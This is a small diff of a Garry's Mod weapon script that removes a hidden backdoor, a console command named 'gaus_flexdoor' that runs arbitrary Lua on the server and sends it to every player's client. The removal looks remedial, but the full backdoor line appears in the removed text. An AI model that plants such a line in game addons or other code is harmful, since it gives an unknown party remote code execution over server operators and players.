@@ -97,5 +97,3 @@ function SWEP:BulletCallback(tr, dmginfo)
 		end
 	end
 end
-
-concommand.Add("gaus_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
